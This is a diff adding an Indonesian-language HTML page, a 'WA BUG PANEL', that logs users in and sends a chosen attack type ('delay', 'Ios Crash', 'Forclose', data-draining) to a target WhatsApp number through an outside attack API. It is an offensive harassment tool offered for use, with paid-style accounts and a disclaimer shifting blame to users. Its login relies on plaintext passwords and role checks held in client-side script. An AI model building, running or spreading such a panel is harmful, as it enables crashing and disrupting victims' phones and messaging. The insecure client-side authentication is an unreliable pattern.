@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>WA BUG PANEL - bailadev</title>
+  <style>
+    body {
+      margin: 0;
+      color: #0f0;
+      font-family: 'Courier New', monospace;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      height: 100vh;
+      overflow-y: auto;
+      padding: 20px 0;
+    }
+    .teks-hitam { color: white; }
+    .container { text-align: center; width: 95%; max-width: 500px; }
+    h2 { margin-bottom: 20px; }
+    input {
+      width: 100%; padding: 12px; margin-bottom: 10px;
+      background: #000; color: #0f0; border: 1px solid #0f0;
+    }
+    button {
+      width: 100%; padding: 12px;
+      background: #000; color: #0f0; font-weight: bold;
+      border: 2px solid #0f0; cursor: pointer; transition: .3s;
+    }
+    button:hover { background: #0f0; color: #000; }
+    .btn-bug {
+      width: calc(33.33% - 10px); margin: 5px; display: inline-block;
+    }
+    .notif {
+      margin-top: 10px; font-size: 14px; white-space: pre-line; font-weight: bold;
+    }
+    #loadingText {
+      display: none; animation: blink 1s step-end infinite;
+      margin-top: 15px; font-weight: bold;
+    }
+    @keyframes blink { 50% { opacity: 0.4; } }
+    .dev-link {
+      display: inline-block; margin: 20px auto 10px;
+      padding: 6px 14px; color: #00ffff; border: 1px solid #00ffff;
+      text-decoration: none; font-weight: bold; border-radius: 6px; font-size: 14px;
+    }
+    .dev-link:hover { background: #00ffff; color: #000; }
+    .promo-text, .warning-text { font-size: 14px; margin-top: 10px; }
+    .promo-text { color: #0f0; }
+    .warning-text { color: red; }
+    .copyright { margin-top: 20px; font-size: 12px; color: #555; }
+
+    #durasiModal {
+      display: none;
+      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(0, 0, 0, 0.8);
+      z-index: 999;
+      justify-content: center;
+      align-items: center;
+    }
+    #durasiModal .modal-content {
+      background: #000; padding: 20px; border: 2px solid #0f0;
+      color: #0f0; text-align: center; max-width: 300px;
+      border-radius: 10px; width: 90%;
+    }
+    #durasiModal button { margin: 10px 0; padding: 10px; width: 100%; background: #0f0; color: #000; font-weight: bold; border: none; }
+    #durasiModal button.cancel { background: red; color: white; }
+  </style>
+</head>
+<body>
+
+  <!-- Background video (muted, loop, tengah layar) -->
+  <video autoplay muted loop playsinline id="bgVideoBg"
+    style="position: fixed;
+           top: 50%; left: 50%;
+           min-width: 100%; min-height: 100%;
+           transform: translate(-50%, -50%);
+           object-fit: cover;
+           z-index: -1;
+           pointer-events: none;">
+    <source src="https://files.catbox.moe/88sj7m.mp4" type="video/mp4">
+  </video>
+
+  <div class="container">
+    <div id="expiredInfo" style="font-size: 12px; color: #aaa; margin-bottom: 5px;"></div>
+    <h2>🦅 APK BUG BY BAILA V3</h2>
+
+    <!-- Login -->
+    <div id="loginBox">
+      <input type="text" id="username" placeholder="masukkan username" />
+      <input type="password" id="accessCode" placeholder="masukkan password" />
+      <button onclick="verifyCode()">MASUK</button>
+      <div class="notif" id="notifLogin"></div>
+      <div style="margin-top: 10px;">
+        <span class="teks-hitam">belum punya akun?</span>
+        <a class="dev-link" href="https://wa.me/6281330224331" target="_blank">Klik di sini</a>
+      </div>
+    </div>
+
+    <!-- Main Panel -->
+    <div id="mainPanel" style="display:none;">
+      <input type="text" id="targetNumber" placeholder="Nomor Target (628xxxxxxx)" />
+      <div class="notif" id="loadingText">⏳ Sedang mengirim bug...</div>
+      <div class="notif" id="notifBug"></div>
+
+      <div style="margin-top: 20px;">
+        <button class="btn-bug" onclick="kirimBug('delay')">Super Delay</button>
+        <button class="btn-bug" onclick="kirimBug('delayinvis')">Invis Delay</button>
+        <button class="btn-bug" onclick="kirimBug('delay3day')">delay prema</button>
+      </div>
+      <div>
+        <button class="btn-bug" onclick="kirimBug('dozer')">sedot Kuota</button>
+        <button class="btn-bug" onclick="kirimBug('iosinvis')">Ios Crash</button>
+        <button class="btn-bug" onclick="kirimBug('fc')">Forclose</button>
+      </div>
+
+      <a class="dev-link" href="https://whatsapp.com/channel/0029VbAkdKXHAdNSpwNFSK2A" target="_blank">👨‍💻 info up apk</a>
+      <p class="promo-text">❗kalo ada err laporan dev.</p>
+      <p class="warning-text">⚠️ Gunakan dengan bijak. Penyalahgunaan bukan tanggung jawab developer.</p>
+
+      <!-- Admin tools -->
+      <div id="adminTools" style="margin-top: 40px; display:none;">
+        <button onclick="tampilkanSemuaUser()" style="width: 100%; padding: 10px; background: #222; color: #0f0; font-weight: bold;">👥 Lihat Semua User</button>
+        <div id="semuaUserPanel" style="display:none; margin-top: 20px;"></div>
+
+        <button onclick="buatAkunBaru('developer')" style="margin-top:15px;width: 100%;padding: 10px;background:#00ffff;color:black;">➕ add  Developer</button>
+        <button onclick="buatAkunBaru('admin')" style="margin-top:10px;width: 100%;padding: 10px;background:#ffff00;color:black;">➕ add Admin</button>
+        <button onclick="buatAkunBaru('user')" style="margin-top:10px;width: 100%;padding: 10px;background:#0f0;color:black;">➕ add User</button>
+      </div>
+
+      <button id="resetBtn" onclick="resetSemuaAkun()" style="display:none;margin-top:10px;width: 100%;padding: 10px;background:#f00;color:white;">🗑️ hapus Semua Akun</button>
+    </div>
+  </div>
+
+  <!-- Modal Durasi -->
+  <div id="durasiModal">
+    <div class="modal-content">
+      <h3>Pilih Durasi Akun</h3>
+      <button onclick="setDurasi('1w')">1 Minggu</button>
+      <button onclick="setDurasi('1m')">1 Bulan</button>
+      <button onclick="setDurasi('permanent')">Permanen</button>
+      <button onclick="tutupModal()" class="cancel">Batal</button>
+    </div>
+    <div class="copyright">© 2025 baila</div>
+  </div>
+
+  <!-- Overlay Video (dengan suara, 5 detik) -->
+  <div id="videoOverlay" style="
+    display:none;
+    position:fixed;
+    top:0;left:0;width:100%;height:100%;
+    background:black;
+    z-index:1000;">
+    <video id="bgVideoOverlay" playsinline
+        style="width:100%;height:100%;object-fit:cover;">
+      <source src="https://files.catbox.moe/w2xa1a.mp4" type="video/mp4">
+    </video>
+  </div>
+
+  <script>
+  // ====== DATA USER ======
+  let users = [
+    { username: "m",    password: "q",     role: "user", expiredAt: null },
+    { username: "dyytzy", password: "PUNGGUT44",  role: "user", expiredAt: null },
+    { username: "nama",  password: "12345", role: "user", expiredAt: null },
+    { username: "nama",  password: "12345", role: "user", expiredAt: null },
+    { username: "nama",  password: "12345", role: "user", expiredAt: null },
+    { username: "nama",  password: "12345", role: "user", expiredAt: null },
+    { username: "nama",  password: "12345", role: "user", expiredAt: null },
+    { username: "nama",  password: "12345", role: "user", expiredAt: null },
+    { username: "nama",  password: "12345", role: "user", expiredAt: null },
+    { username: "nama",  password: "12345", role: "user", expiredAt: null },
+    { username: "nama",  password: "12345", role: "user", expiredAt: null },
+  ];
+  let pendingNewUser = null;
+
+  // ====== AUTH ======
+  function verifyCode() {
+    const username = document.getElementById("username").value.trim();
+    const password = document.getElementById("accessCode").value.trim();
+    const notif = document.getElementById("notifLogin");
+
+    const user = users.find(u => u.username === username && u.password === password);
+
+    if (user) {
+      notif.style.color = "#0f0";
+      notif.textContent = `✅ Selamat datang, ${user.username}`;
+      setTimeout(() => {
+        document.getElementById("loginBox").style.display = "none";
+        document.getElementById("mainPanel").style.display = "block";
+        document.getElementById("expiredInfo").textContent = user.expiredAt
+          ? `🗓️ Expired: ${new Date(user.expiredAt).toLocaleDateString()}`
+          : `♾️ Akun permanen`;
+        const isPrivileged = ["admin", "developer"].includes(user.role);
+        document.getElementById("adminTools").style.display = isPrivileged ? "block" : "none";
+        document.getElementById("resetBtn").style.display = isPrivileged ? "block" : "none";
+      }, 700);
+    } else {
+      notif.style.color = "red";
+      notif.textContent = "❌ Username atau password salah!";
+    }
+  }
+
+  // ====== OVERLAY VIDEO 5s DENGAN SUARA ======
+  function showVideoOverlay() {
+    const overlay = document.getElementById("videoOverlay");
+    const video = document.getElementById("bgVideoOverlay");
+
+    overlay.style.display = "block";
+    video.currentTime = 0;
+    video.muted = false;
+    video.volume = 1.0;
+    video.play().catch(err => console.log("Autoplay gagal:", err));
+
+    setTimeout(() => {
+      overlay.style.display = "none";
+      video.pause();
+    }, 5000);
+  }
+
+  // ====== KIRIM BUG ======
+  function kirimBug(type) {
+    const target = document.getElementById("targetNumber").value.trim();
+    const notif = document.getElementById("notifBug");
+    const loading = document.getElementById("loadingText");
+
+    notif.textContent = "";
+    notif.style.display = "none";
+
+    if (!target.startsWith("62") || target.length < 10) {
+      notif.style.color = "red";
+      notif.textContent = "⚠️ Nomor tidak valid!";
+      notif.style.display = "block";
+      return;
+    }
+
+    showVideoOverlay();
+    loading.style.display = "block";
+
+    const url = `https://apievolution.gacorr.biz.id/evolution?type=${encodeURIComponent(type)}&chatId=${target}@s.whatsapp.net`;
+
+    fetch(url)
+      .then(res => res.json())
+      .then(data => {
+        loading.style.display = "none";
+        if (data.success === true) {
+          notif.style.color = "#0f0";
+          notif.textContent = `✅ BUG "${type}" berhasil dikirim ke ${target}`;
+        } else {
+          notif.style.color = "red";
+          notif.textContent = `❌ Gagal: ${data.message || "Unknown error"}`;
+        }
+        notif.style.display = "block";
+      })
+      .catch(err => {
+        loading.style.display = "none";
+        notif.style.color = "red";
+        notif.textContent = `❌ Gagal: ${err}`;
+        notif.style.display = "block";
+      });
+  }
+
+  // ====== ADMIN TOOLS ======
+  function tampilkanSemuaUser() {
+    const panel = document.getElementById("semuaUserPanel");
+    panel.style.display = (panel.style.display === "none" || panel.style.display === "") ? "block" : "none";
+    panel.innerHTML = users.length
+      ? users.map((u, i) => `<div style="text-align:left;margin:6px 0;border-bottom:1px dashed #0f0;padding-bottom:6px;">${i+1}. <b>${u.username}</b> — ${u.role} ${u.expiredAt ? `| Exp: ${new Date(u.expiredAt).toLocaleDateString()}` : '| Permanent'}</div>`).join("")
+      : '<i>Belum ada user.</i>';
+  }
+
+  function buatAkunBaru(role) {
+    const username = prompt(`Username ${role} baru:`);
+    if (!username) return;
+    const password = prompt(`Password untuk ${username}:`);
+    if (!password) return;
+    window.pendingNewUser = { username, password, role };
+    document.getElementById('durasiModal').style.display = 'flex';
+  }
+
+  function setDurasi(durasi) {
+    const p = window.pendingNewUser;
+    if (!p) { tutupModal(); return; }
+    let expiredAt = null;
+    if (durasi === '1w') expiredAt = Date.now() + 7*24*60*60*1000;
+    if (durasi === '1m') expiredAt = Date.now() + 30*24*60*60*1000;
+    users.push({ username: p.username, password: p.password, role: p.role, expiredAt });
+    window.pendingNewUser = null;
+    tutupModal();
+    alert('Akun berhasil dibuat');
+    const panel = document.getElementById("semuaUserPanel");
+    if (panel.style.display === 'block') tampilkanSemuaUser();
+  }
+
+  function tutupModal() {
+    document.getElementById('durasiModal').style.display = 'none';
+  }
+
+  function resetSemuaAkun() {
+    if (!confirm('Yakin hapus semua akun?')) return;
+    users = [];
+    tampilkanSemuaUser();
+    alert('Semua akun dihapus.');
+  }
+  </script>
+</body>
+</html>
